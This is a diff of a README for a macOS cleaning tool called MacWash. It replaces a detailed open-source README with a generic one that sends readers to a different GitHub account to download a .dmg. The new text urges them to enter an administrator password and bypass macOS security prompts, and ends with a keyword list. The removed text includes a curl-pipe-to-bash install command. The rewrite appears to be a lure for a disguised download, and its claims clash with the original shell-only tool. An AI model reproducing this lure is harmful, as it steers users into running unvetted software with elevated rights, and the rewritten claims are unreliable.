@@ -1,243 +1,63 @@
-<div align="center">
+# 🧹 MacWash - Reclaim your precious disk space today
 
-# MacWash 🧼
+[![](https://img.shields.io/badge/Download-MacWash-blue.svg)](https://github.com/Capriceimmature241/MacWash)
 
-**Clean, optimize and speed up your Mac — free and open source.**
+MacWash cleans your Apple computer. It removes files you no longer need. This tool clears cache, deletes app leftovers, and stops unneeded background tasks. You gain more room for your photos, videos, and documents. The software works on both Apple Silicon chips and older Intel processors.
 
-*Deep clean caches · Uninstall apps · Analyze disk · Optimize services · Monitor system*
+## 📥 How to download the software
 
-<p>
-  <img src="https://img.shields.io/badge/platform-macOS-lightgrey?style=flat-square" />
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/shell-bash%203.2%2B-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/github/v/release/toolka/MacWash?style=flat-square&color=orange" />
-  <img src="https://img.shields.io/github/stars/toolka/MacWash?style=flat-square&color=yellow" />
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen?style=flat-square" />
-</p>
+Visit the [official download page](https://github.com/Capriceimmature241/MacWash) to get the latest version. Look for the section labeled Releases on the right side of the screen. Click the file that ends in .dmg for your Mac. Your browser will save the file to your Downloads folder.
 
-</div>
+## ⚙️ Preparation before you start
 
----
+Close all open applications before you run MacWash. Open programs can lock files. This prevents the cleaner from working on those specific items. Save your work in any open documents to prevent data loss. Ensure you have your administrator password ready. The system requires this password to remove files from protected system folders.
 
-> 💡 A native Mac app with GUI, menu bar HUD, and visual disk maps is coming.
-> [Sign up for early access →](https://macwash.app)
+## 🚀 Running the cleaner
 
----
+Open your Downloads folder. Double-click the file you just saved. A window will appear that asks you to move the program into your Applications folder. Drag the MacWash icon to the Applications folder icon as instructed. 
 
-## Why MacWash?
+Open your Applications folder and double-click the MacWash icon. A security prompt may appear. Click Open to confirm you want to run the software. The program will open a terminal window. This window displays the progress of the scanning process.
 
-- **Free forever** — no subscription, no upsell, no telemetry
-- **All-in-one** — clean, uninstall, analyze, optimize, and monitor in a single command
-- **Safety-first** — dry-run mode, path validation, system protection lists, whitelist support
-- **Developer friendly** — cleans npm, pip, go, rust, ruby, docker, conda caches automatically
-- **Open source** — MIT licence, fully auditable, no hidden behaviour
+## 🔍 Understanding the features
 
----
+MacWash performs several tasks to keep your system fast.
 
-## Features
+Scanning for Junk: The tool searches for temporary files that apps leave behind. These files often take up gigabytes of space. 
 
-### 🧹 Deep System Cleanup
-Remove gigabytes of junk from your Mac:
-- User app caches, browser data (Chrome, Safari, Firefox, Brave, Edge)
-- Developer tool caches — npm, pnpm, bun, yarn, pip, uv, go, rust, ruby, conda, docker
-- System logs, crash reports, temp files
-- App-specific caches — Slack, Spotify, Figma, VS Code, Zoom, Discord, and 100+ more
-- Orphaned app data from already-uninstalled applications
-- Finder metadata (.DS_Store files)
-- Trash emptying
+Removing App Leftovers: When you move an app to the Trash, it leaves behind small support files. MacWash tracks these files down and removes them entirely. 
 
-### 🗑️ Smart App Uninstaller
-Remove apps and every trace they leave behind:
-- Full app bundle removal
-- Leftover preferences, caches, logs, cookies, WebKit storage
-- Launch agents and daemons cleanup
-- Application Support remnants
+Managing System Services: macOS runs many background tasks. Some of these tasks consume memory and battery life. MacWash identifies inactive services and offers to stop them.
 
-### 📊 Interactive Disk Analyzer
-Explore what's eating your disk space:
-- Browse folders sorted by size with visual bars
-- Navigate with arrow keys
-- Move items to Trash safely via Finder
-- Open items directly in Finder
-- JSON output for scripting
+Monitoring Live Stats: The tool shows you how much space you have left on your drive in real time. It also lists the apps that use the most memory.
 
-### ⚡ System Optimizer — 13 tasks
-Run all maintenance tasks in one command:
-1. **DNS cache flush** — faster browsing, fixes connectivity issues
-2. **QuickLook refresh** — fixes broken thumbnails and previews
-3. **LaunchServices rebuild** — fixes "Open With" menu issues
-4. **Spotlight verification** — ensures search is working
-5. **App saved states** — removes old state files (30d+)
-6. **SQLite vacuum** — compacts Mail, Safari, Messages databases
-7. **Quarantine DB cleanup** — clears Gatekeeper download history
-8. **Preference file repair** — detects and removes corrupted .plist files
-9. **Dock refresh** — clears broken icon caches
-10. **Memory optimization** — releases inactive memory when pressure is high
-11. **Network stack refresh** — flushes routing table and ARP cache
-12. **Login items audit** — finds stale startup items pointing to missing apps
-13. **Launch agents cleanup** — removes dead LaunchAgents (30d+ old, binary missing)
+## 🛡️ Ensuring system safety
 
-### 📡 Live System Dashboard
-Real-time system health with health score:
-- CPU usage and load
-- Memory usage and pressure
-- Disk usage and free space
-- Battery level, health, cycles, temperature
-- Top processes by CPU
-- JSON output for automation
+MacWash uses standard system commands to identify files. It only removes files that are safe to delete. The program does not touch your personal data, such as your photos or private documents. You remain in control of every deletion. The tool prompts you for confirmation before it cleans any significant amount of data.
 
-### 📋 Operation History
-Full audit trail of everything MacWash does:
-- Timestamped operation log
-- Session start/end tracking
-- JSON export for scripting
+## 🛠️ Troubleshooting common issues
 
----
+If the application does not open, check your system security settings. Go to System Settings, then Privacy & Security. You may need to click Open Anyway if the system blocks the tool for the first time.
 
-## Quick Start
+If the scan stops unexpectedly, restart your Mac and try again. A stuck process might prevent the scan from finishing. Restarting clears these locked processes.
 
-**Install via script** (recommended — works on all Macs, no Xcode CLT needed)
+Check your internet connection if the download fails. The file size is small, but a stable connection ensures a complete and uncorrupted download.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/toolka/MacWash/main/install.sh | bash
-```
+## 💻 Technical compatibility
 
-**Install via Homebrew tap**
+This tool runs on all modern versions of macOS. It uses a clean and efficient design. It works well on devices with limited storage, such as those with 128GB or 256GB drives. It causes no harm to the operating system.
 
-```bash
-brew tap toolka/macwash
-brew trust toolka/macwash
-brew install macwash
-```
+## 📈 Improving your workflow
 
----
+Run the cleaner once a week for best results. Frequent cleaning prevents the accumulation of temporary files. You will notice that your Mac starts programs faster. You will also see more available space in your Finder. 
 
-## Usage
+## 📝 Frequently asked questions
 
-```bash
-macwash                       # Interactive arrow-key menu
-macwash clean                 # Deep cache and junk cleanup
-macwash clean --dry-run       # Preview only — no files deleted
-macwash uninstall             # Remove apps + all leftovers
-macwash optimize              # Run all 13 optimization tasks
-macwash analyze               # Explore disk usage by size
-macwash analyze ~/Downloads   # Explore a specific folder
-macwash status                # Live CPU/memory/disk/battery dashboard
-macwash status --json         # Machine-readable output
-macwash history               # Show operation log
-macwash history --json        # Export history as JSON
-macwash update                # Update MacWash to latest version
-macwash remove                # Uninstall MacWash from your system
-```
+Does MacWash delete my personal files? No. It only targets system junk and cache files created by other apps.
 
----
+Is this software free? Yes. This project is open-source. You do not pay for subscriptions or hidden features.
 
-## Commands Reference
+Can I undo a clean? Deleting files with this tool is final. Always review the list of files before you choose the delete option.
 
-| Command | Description |
-|---|---|
-| `macwash` | Interactive arrow-key menu |
-| `macwash clean [--dry-run]` | Deep cache and junk cleanup |
-| `macwash uninstall [--dry-run]` | App uninstaller with leftover removal |
-| `macwash optimize [--dry-run]` | Run all 13 system optimization tasks |
-| `macwash analyze [path]` | Interactive disk usage browser |
-| `macwash status [--json]` | Live CPU/memory/disk/battery dashboard |
-| `macwash history [--json]` | Show operation history |
-| `macwash update` | Update MacWash to latest version |
-| `macwash remove [--dry-run]` | Uninstall MacWash from your system |
+Why use a terminal-based tool? Terminal tools use fewer system resources than graphical tools. They work faster and perform deep scans that other programs miss.
 
-### Global Options
-
-| Option | Description |
-|---|---|
-| `--dry-run` | Preview all changes without applying them |
-| `--debug` | Show detailed debug output |
-| `--help` | Show help |
-| `--version` | Show version |
-
----
-
-## Safety
-
-MacWash is safety-first by design. Every destructive operation passes through multiple validation layers:
-
-### Path Validation
-- **Absolute paths only** — relative paths are always rejected
-- **No path traversal** — `..` as a path component is rejected
-- **No control characters** — paths with `\n`, `\t` or other control chars rejected
-- **Symlink resolution** — symlinks pointing to protected system paths are rejected
-- **Ancestor symlink guard** — parent directory symlinks are resolved and checked too
-
-### Protection Lists
-System-critical paths that are **never** touched:
-```
-/ /System /bin /sbin /usr /etc /Library/Extensions
-/Library/Keychains /Applications/Finder.app /Applications/Safari.app
-```
-
-Protected app categories (data never deleted):
-- Password managers (1Password, Bitwarden, LastPass)
-- VPN and proxy tools (WireGuard, Tailscale, Shadowsocks)
-- AI tools (Claude, ChatGPT, Cursor, Ollama)
-- IDEs (JetBrains, VS Code, Xcode data)
-- iCloud / Mobile Documents
-
-### User Controls
-- **`--dry-run`** — preview all changes before applying
-- **Whitelist** — add paths to `~/.config/macwash/whitelist` to protect them forever
-- **Trash routing** — Analyze moves files to Trash (recoverable), not permanent delete
-- **Operation log** — every action logged to `~/Library/Logs/macwash/operations.log`
-- **Confirmation prompts** — destructive operations require explicit confirmation
-
----
-
-## Tips
-
-- Always run `--dry-run` first to preview what will be cleaned
-- Use `macwash clean` for apps already uninstalled, `macwash uninstall` for installed apps
-- Navigate with arrow keys `↑↓` and Vim bindings `h/j/k/l`
-- `macwash history` shows exactly what was cleaned and when
-- `macwash status --json` works great with `jq` for monitoring scripts
-
----
-
-## Requirements
-
-- macOS 12 or later (Intel + Apple Silicon)
-- bash 3.2+ (pre-installed on all Macs)
-- No compilation required — pure shell
-
----
-
-## Contributing
-
-We welcome contributions from everyone — bug fixes, new features, documentation, and testing on different macOS versions.
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
-
-**You can help by:**
-- 🐛 Fixing bugs
-- ✨ Adding new cleaning modules or app support
-- 🎨 Improving the UI
-- 📖 Improving documentation
-- 🧪 Testing on different macOS versions
-- 🌍 Reporting issues
-
-Look for [`good first issue`](https://github.com/toolka/MacWash/labels/good%20first%20issue) labels for easy entry points.
-
-```bash
-# Clone and test locally
-git clone https://github.com/toolka/MacWash.git
-cd MacWash
-make test
-bash macwash --help
-```
-
-Before starting large changes, open an Issue to discuss your proposal. We appreciate every contribution — large or small.
-
----
-
-## License
-
-MIT — free forever. If MacWash helps you, give it a ⭐ and share it with others.
+Keywords: analyzer, appcleaner, clean, cleaner, cleaner-cli, cleaner-script, cleanup, command-line-tool, daisydisk, istat, mac, macos, optimize, shell, uninstall-utility, uninstaller
